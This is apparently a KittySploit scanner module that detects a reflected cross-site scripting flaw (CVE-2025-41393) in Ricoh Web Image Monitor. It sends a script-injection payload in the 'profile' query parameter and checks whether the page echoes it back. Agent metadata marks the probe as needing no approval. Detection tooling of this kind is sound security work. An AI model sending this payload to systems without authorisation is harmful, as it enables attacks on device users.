#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting vulnerability exists in the laser printers and MFPs (multifunction printers) ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ricoh Web Image Monitor - Reflected XSS Detection',
        'description': 'A reflected cross-site scripting vulnerability exists in the laser printers and MFPs (multifunction printers) which implement Ricoh Web Image Monitor. If exploited, an arbitrary script may be executed on the web browser of the user who accessed Web Image Monitor.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'ricoh', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.ricoh.com/products/security/vulnerabilities/vul?id=ricoh-2025-000001',
            'https://jvn.jp/en/jp/JVN20474768/',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-41393',
        ],
        'cve': 'CVE-2025-41393',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?profile=</script><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<script>alert(document.domain)</script>', 'websys/webArch/mainFrame.cgi', 'Web Image Monitor',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Ricoh Web Image Monitor - Reflected XSS detected",
                path='/?profile=</script><script>alert(document.domain)</script>',
            )
            return True
        return False

